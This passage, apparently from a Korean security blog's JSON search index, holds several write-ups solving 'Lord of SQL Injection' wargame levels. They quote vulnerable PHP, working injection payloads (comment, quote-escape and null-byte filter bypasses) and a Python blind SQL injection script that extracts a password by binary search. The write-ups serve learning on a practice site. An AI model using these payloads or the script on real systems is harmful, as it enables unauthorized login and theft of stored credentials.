0 0 0 [+] Found  36 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  37 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  38 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  39 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  40 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  41 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  42 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  43 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  44 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  45 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  46 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  47 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  48 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  49 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  50 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  51 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  52 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  53 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  54 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  55 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  56 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  57 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  58 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  59 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  60 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  61 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  62 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  63 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  64 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  65 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  66 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  67 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found  68 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] Found password :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 [+] End이렇게 결과로 나온 값을 xavis 문제에서 사용했던 사이트에서 돌려 보았더니 루비꺼야!빼애애애애애애애액!!!이라는 값을 얻을 수 있었다.당황…그래서 이 값을 pw 값으로 넘겨주었더니 문제를 풀 수 있었다.?pw=루비꺼야!빼애애애애애애애액!!!------------------------------------------------------------------------------------------------------------------------------query : select id from prob_iron_golem where id='admin' and pw='루비꺼야!빼애애애애애애애액!!!'------------------------------------------------------------------------------------------------------------------------------IRON_GOLEM Clear!&lt;?php  include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit(\"HeHe\");  $query = \"select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(mysql_error()) exit(mysql_error());  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";    $_GET[pw] = addslashes($_GET[pw]);  $query = \"select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"iron_golem\");  highlight_file(__FILE__);?&gt;IRON_GOLEM Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/08/16/los-iron_golem.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-08-15-los-dragon-html": {
        "title": "[Lord of SQL Injection] LoS - dragon 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 15, 2018",
        "author": "",
        "category": "",
        "content": "다음 문제는 dragon이다.메인 이미지가 용이 산다 웹툰의 마리다.대존귀탱 ㅠㅠ코드는 다음과 같다.-------------------------------------------------------------------------------------query : select id from prob_dragon where id='guest'# and pw=''-------------------------------------------------------------------------------------Hello guest&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   $query = \"select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";   if($result['id'] == 'admin') solve(\"dragon\");  highlight_file(__FILE__); ?&gt;이번 문제에서는 쿼리문 중간에 #이 들어가 있다.#은 MySQL에서 주석을 의미한다.처음에는 이 주석을 어떻게 우회할 수 있지 않을까 생각했다.그래서 이것저것 찾다가 executabl comments를 찾게 되었다.MySQL 에서 주석이 여러개가 있는데, 그 중에 /* */이 있다.이 때, /*! QUERY */ 이런식으로 안에 느낌표를 넣어주면, 해당 쿼리를 실행할 수 있다고 한다.쨌든 이건 문제 풀이와는 상관 없다.주석을 우회할 수 없을까 계속 고민하다가 서버에서 MySQL을 실행시키고 쿼리를 여러개 테스트 해 보았다.mysql&gt; select idx from board where idx=50# or idx=/*!####51*/;    -&gt; ;mysql&gt; select 1 from board where idx=50# or #idx=51;    -&gt; ;이런 형태로 테스트를 해 보았는데, 한가지 특징이 나타났다.잘 보면, # 이후는 다 주석처리가 됬다는 사실을 알 수 있다.때문에 쿼리가 완성이 되지 않았기 때문에 다음 줄을 입력하라고 떴고, 거기에 ;을 입력 해 쿼리를 완성시켜주었더니 정상적으로 쿼리가 실행되었다.즉, #은 한 줄짜리 주석이며, MySQL은 여러 줄에 걸쳐 쿼리를 작성할 수 있다.이번에는 이 점을 이용해서 문제를 풀었다.현재 쿼리는 다음과 같다.select id from prob_dragon where id='guest'# and pw=''그런데 만약 여기서 pw에 %0a를 입력 해 개행한다면 다음과 같이 구성 될 것이다.select id from prob_dragon where id='guest'# and pw=''이 때, 다음 줄은 주석이 아니므로 정상적으로 쿼리를 이어서 실행시킬 수 있게 된다.select id from prob_dragon where id='guest'# and pw='and pw=1 or id='admin'따라서 위와 같이 쿼리를 구성한다면 다음 줄의 쿼리를 실행시킬 수 있다.이를 위해 URL에 아래와 같이 입력 해 문제를 풀 수 있었다.?pw=%0a and pw=1 or id='admin--------------------------------------------------------------------------------------------------------------------query : select id from prob_dragon where id='guest'# and pw=' and pw=1 or id='admin'--------------------------------------------------------------------------------------------------------------------Hello adminDRAGON Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   $query = \"select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";   if($result['id'] == 'admin') solve(\"dragon\");  highlight_file(__FILE__); ?&gt;DRAGON Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/08/15/los-dragon.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-08-14-los-xavis-html": {
        "title": "[Lord of SQL Injection] LoS - xavis 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 14, 2018",
        "author": "",
        "category": "",
        "content": "아 이거 너무 오래 고민했는데 너무 허무하다.내가 마블 영화에서 젤 좋아하는게 아이언맨이고 그 중에서도 좋아하는게 자비스 캐릭터였는데, 이 문제때문에 싫어질라고 했다.근데 어찌어찌 풀었는데 나한테 화가난다 ㅋㅋㅋㅋ코드는 다음과 같다.---------------------------------------------------------------------------------query : select id from prob_xavis where id='admin' and pw=''---------------------------------------------------------------------------------&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");  if(preg_match('/regex|like/i', $_GET[pw])) exit(\"HeHe\");   $query = \"select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";      $_GET[pw] = addslashes($_GET[pw]);   $query = \"select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'\";   $result = @mysql_fetch_array(mysql_query($query));   if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"xavis\");   highlight_file(__FILE__); ?&gt;일단 소스코드는 간단하다.보면 regex랑 like은 사용을 못하도록 되어있는데, 그거 외에 ', \", =, and, or에 필터링이 없다.그래서 처음엔 그냥 Blind SQL Injection인줄 알고 이 전에 사용했었던 소스코드를 가져와 돌려보았다.그런데 length는 12라고 나오는데, 막상 pw는 4번째 문자부터만 찾았다.거기다 4번째 문자 ~ 12번째 문자까지가 싹 다 0이 나왔다.뭔가 이상하다 싶어서 ord랑 부등호를 사용해서 첫 번째 글자를 대충 손으로 찾아 보았다.그랬더니 값이 무려 50000대가 나왔다.hex로 값을 바꾸어 보니 0xc6b0이 나왔는데, 보니까 우리가 일반적으로 사용하는 아스키코드 범위 내의 문자가 아닌 것 같았다.그래서 원래 소스코드에서 48 ~ 127까지 비교하던 값을 0x0 ~ 0xffff 즉,  0 ~ 65536까지로 바꾸었다.첨엔 이렇게 소스코드 짜고 돌리려고 했는데, 생각해보니 최악의 경우 0 ~ 65536까지 12번을 비교해야 한다.뭔가 서버가 터질까봐 두려워서 횟수를 줄일 수 있는 방법을 찾다가 갑자기 학교 다닐때 배웠던 이진 탐색이 생각났다.그래서 이 이진 탐색(Binary Search) 알고리즘을 사용해서 아래와 같이 소스코드를 구현했다.import urllib2import urllibimport requestsdef testEqual(j, num):        try:                query = url + \"1' or id='admin' and ord(substr(pw, \" + str(j) + \", 1)) = \" + str(num) + \"%23\"                r = requests.post(query, cookies=session)        except:                print \"[-] Error occur\"                if 'Hello admin' in r.text:                return True        else:                return Falsedef testBigger(j, num):        try:                query = url + \"1' or id='admin' and ord(substr(pw, \" + str(j) + \", 1)) &lt; \" + str(num) + \"%23\"                r = requests.post(query, cookies=session)        except:                print \"[-] Error occur\"                if 'Hello admin' in r.text:                return True        else:                return Falsedef searchPw(j, start, end):        if start &gt; end:                return \"None\"        mid = (start + end) / 2        if testEqual(j, mid):                return hex(mid)        elif testBigger(j, mid):                end = mid - 1        else:                start = mid + 1        return searchPw(j, start, end)               flag = \"0x\"length = 0url = \"http://los.rubiya.kr/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find length of the password\"for i in range(0, 20):        try:                query = url + \"1' or id='admin' and length(pw)=\" + str(i) + \"%23\"                r = requests.post(query, cookies=session)        except:                print \"[-] Error occur\"                continue        if 'Hello admin' in r.text:                length = i                breakprint \"[+] Found length : \", lengthprint \"[+] Find password\"for j in range(1, length + 1):        flag += str(searchPw(j, 0, 65535))[2:]        print \"[+] Found \", str(j), \"'s pw : \", flagprint \"[+] Found password : \", flagprint \"[+] End\"이 소스코드를 돌리면 결과는 아래와 같이 나온다.$ python ex.py [+] Start[+] Find length of the password[+] Found length :  12[+] Find password[+] Found  1 's pw :  0xc6b0[+] Found  2 's pw :  0xc6b0c655[+] Found  3 's pw :  0xc6b0c655ad73[+] Found  4 's pw :  0xc6b0c655ad730[+] Found  5 's pw :  0xc6b0c655ad7300[+] Found  6 's pw :  0xc6b0c655ad73000[+] Found  7 's pw :  0xc6b0c655ad730000[+] Found  8 's pw :  0xc6b0c655ad7300000[+] Found  9 's pw :  0xc6b0c655ad73000000[+] Found  10 's pw :  0xc6b0c655ad730000000[+] Found  11 's pw :  0xc6b0c655ad7300000000[+] Found  12 's pw :  0xc6b0c655ad73000000000[+] Found password :  0xc6b0c655ad73000000000[+] End4번째부터는 0이 나오는 걸 보니, 실제로는 3글자인 것 같았다.여기까진 어렵지 않게 왔는데, 문제는 지금부터였다.딱봐도 그냥 아스키코드는 아니고 확장 아스키코드인가 싶어서 인터넷을 뒤져서 Converter에 돌려 보았었다.막 다 이상한 문자만 출력 해 주길래 그게 맞는건줄 알고 계속 시도했다.근데 아무리 해도 안됨ㅋ매일매일 뭐가 잘못된건지 뒤져보는데 아무리봐도 모르겠어서 며칠동안 내가 코드를 잘못짰나, 아니면 변환기를 잘못 사용했나 해서 진짜 사이트 여기저기 돌아다니면서 Converter를 사용 했었다.그러다가 며칠만에 오늘… 이 사이트를 발견했다.여기 아래 부분에 보면 Decimal이라고, 10진수로 값을 입력하는 곳이 있다.그 칸에 나온 글자 3개의 hex 값을 10진수로 바꾸어 입력 해 주었다.508645077344403OR50864 50773 44403그랬더니 맨 위 칸에 우왕굳이라고 나왔다.ㅋ결국 한글이었다.난 그것도 모르고 변환기가 이상한 문자를 주길래 걔인가 해서 며칠동안 걔만 시도했는데 아니었다.왜 그 사이트에서는 이상한 문자로 준건지를 모르겠다.hex로 입력했을 때랑 decimal로 입력했을 때랑 다른 값을 주는건가…?그럴리가..어쨌든 왜 제대로 변환이 안됬는지 원인은 모르겠지만, 우왕굳을 입력 해 주니 며칠간의 삽질을 끝낼 수 있었다.?pw=우왕굳----------------------------------------------------------------------------------------query : select id from prob_xavis where id='admin' and pw='우왕굳'----------------------------------------------------------------------------------------Hello adminXAVIS Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");  if(preg_match('/regex|like/i', $_GET[pw])) exit(\"HeHe\");   $query = \"select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";      $_GET[pw] = addslashes($_GET[pw]);   $query = \"select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'\";   $result = @mysql_fetch_array(mysql_query($query));   if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"xavis\");   highlight_file(__FILE__); ?&gt;XAVIS Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/08/14/los-xavis.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-08-06-los-nightmare-html": {
        "title": "[Lord of SQL Injection] LoS - nightmare 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 6, 2018",
        "author": "",
        "category": "",
        "content": "이번 문제는 nightmare이다.문제 이름 답게 엄청 고민 많이 했던 문제이다.코드는 다음과 같다.------------------------------------------------------------------------------------------query : select id from prob_nightmare where pw=('') and id!='admin'------------------------------------------------------------------------------------------&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)|#|-/i', $_GET[pw])) exit(\"No Hack ~_~\");   if(strlen($_GET[pw])&gt;6) exit(\"No Hack ~_~\");   $query = \"select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) solve(\"nightmare\");   highlight_file(__FILE__); ?&gt;이번에는 주석으로 사용했던 문자들이 다 필터링이 걸려 있다.그리고 글자 수도 6글자 이내로 적어야 한다는 제한도 있다.그럼 일단 주석에 대한 필터링도 우회해야 하고, pw에 ('') 이런식으로 괄호가 생겨서 이 것도 어떻게 해결해야 할지 고민해야 했다.결론적으로 이건 문제를 못풀겠어서 인터넷을 찾아봤었다.쿼리를 작성할 때, pw=1=1 형태로도 쓸 수 있다.이럴 경우, 1=1은 참이기 때문에 pw=참이 되어 쿼리가 정상적으로 실행된다.이미 쿼리에 ('') 은 있으므로, 이 공백과 비교했을 때 참이될 수 있는 값은 0이다.이를 실제로 테스트 해 보기 위해 아래와 같이 mysql을 실행시켜보았다.mysql&gt; select ''=0 ;+------+| ''=0 |+------+|    1 |+------+1 row in set (0.01 sec)결과값이 1이 나오는 것을 알 수 있다.그래서 ')=0을 넣고, 뒤의 나머지 조건을 무시하게 하기 위해서 ;과 null을 넣어주었다.?pw=')=0;%00그랬더니 문제를 풀 수 있었다.------------------------------------------------------------------------------------------------query : select id from prob_nightmare where pw=('')=0;') and id!='admin'------------------------------------------------------------------------------------------------NIGHTMARE Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)|#|-/i', $_GET[pw])) exit(\"No Hack ~_~\");   if(strlen($_GET[pw])&gt;6) exit(\"No Hack ~_~\");   $query = \"select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) solve(\"nightmare\");   highlight_file(__FILE__); ?&gt;NIGHTMARE Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/08/06/los-nightmare.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-08-05-los-succubus-html": {
        "title": "[Lord of SQL Injection] LoS - succubus 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 5, 2018",
        "author": "",
        "category": "",
        "content": "이번 문제는 succubus이다.succubus는 처음 듣는 이름이라 찾아봤는데, 중세 유럽의 전설이랑 민속에 나오는 악마 이름이라고 한다.코드는 다음과 같다.-------------------------------------------------------------------------------query : select id from prob_succubus where id='' and pw=''-------------------------------------------------------------------------------&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[id])) exit(\"No Hack ~_~\");   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   if(preg_match('/\\'/i', $_GET[id])) exit(\"HeHe\");   if(preg_match('/\\'/i', $_GET[pw])) exit(\"HeHe\");   $query = \"select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) solve(\"succubus\");   highlight_file(__FILE__); ?&gt;지난 번 문제랑 뭐가 다른가 했는데, ereg() 대신에 preg_match()가 사용되었다.이번엔 정말로 '를 우회해야 하는 문제인 것 같다.처음에는 preg_match() 함수에 취약점이 있지 않을까 생각했다.그런데 아무리 찾아도 취약점이 있다는 내용이 보이지 않았고, 아직까지 preg_match()에 대한 취약점이 나오지 않았다는 글이 2017년에 올라와 있었다.그럼 다른 방법으로 문제를 풀어야 했기 때문에 엄청 고민을 했다.이런저런 키워드로 검색을 했는데, 그러다가 \\에 필터링이 없을 경우 이를 이용 해 문제를 풀 수 있다는 내용을 봤다.문제에서, id와 pw를 입력받고 있다.이 때, 만약 id에 \\를 입력하고 pw에는 ` or 1#`를 입력하면 완성되는 쿼리는 아래와 같다.select id from prob_succubus where id='\\' and pw' or 1#때문에 id의 뒤에 있는 '는 \\'가 되며 싱글 쿼터 내의 문자로 인식된다.즉, id가 ' and pw인 행을 찾게 되는 것이다.물론 테이블에는 id가 ' and pw인 행은 없을 것이므로, 뒤의 or 1이 실행되며 값을 추출할 수 있게 된다.따라서 아래와 같이 입력하면 문제를 풀 수 있다.?id=\\&amp;pw= or 1%23문제에서는 결과로 추출 된 id만 있으면 되기 때문에 or 1을 사용했는데, 만약 admin인 id를 추출했어야 했다면 or id=0x61646d696e%23을 pw에 입력하면 문제를 풀 수 있다.--------------------------------------------------------------------------------------query : select id from prob_succubus where id='\\' and pw=' or 1#'--------------------------------------------------------------------------------------SUCCUBUS Clear!&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[id])) exit(\"No Hack ~_~\");   if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   if(preg_match('/\\'/i', $_GET[id])) exit(\"HeHe\");   if(preg_match('/\\'/i', $_GET[pw])) exit(\"HeHe\");   $query = \"select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) solve(\"succubus\");   highlight_file(__FILE__); ?&gt;SUCCUBUS Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/08/05/los-succubus.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-08-04-los-zombie-assassin-html": {
        "title": "[Lord of SQL Injection] LoS - zombie_assassin 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 4, 2018",
        "author": "",
        "category": "",
        "content": "지난 문제에 이어 또 다른 assassin 문제이다.이번에는 zombie_assassin이란다.이 전 문제의 assassin이 죽지도 않고 다시 살아서 돌아왔나보다.코드는 다음과 같다.----------------------------------------------------------------------------------------query : select id from prob_zombie_assassin where id='' and pw=''----------------------------------------------------------------------------------------&lt;?php   include \"./config.php\";   login_chk();   dbconnect();   if(preg_match('/\\\\\\|prob|_|\\.|\\(\\)/i', $_GET[id])) exit(\"No Hack ~_~\");   if(preg_match('/\\\\\\|prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");   if(@ereg(\"'\",$_GET[id])) exit(\"HeHe\");   if(@ereg(\"'\",$_GET[pw])) exit(\"HeHe\");   $query = \"select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysql_fetch_array(mysql_query($query));   if($result['id']) solve(\"zombie_assassin\");   highlight_file(__FILE__); ?&gt;이번에도 '(싱글쿼터)에만 필터링이 있다.그런데 이번에는 like이 아니라 다시 =이 사용되었고, preg_match()가 아니라 ereg()가 사용되었다.ereg()는 이 전에도 한번 언급한 적 있었던 것 같은데, 필터링이 완벽하지 않다.대소문자 구분도 못할뿐더라, %00으로 null byte를 넣어주면 이를 문자열의 끝으로 인식 해 이 뒤의 문자는 검사하지 않는다.때문에 나도 %00을 사용 해 문제를 풀었다.아래와 같이 입력 해 주면 문제를 풀 수 있다.?id=admin&amp;pw=%00a' or id='admin-------------------------------------------------------------------------------------------------------------------query : select id from prob_zombie_assassin where id='admin' and pw='a' or 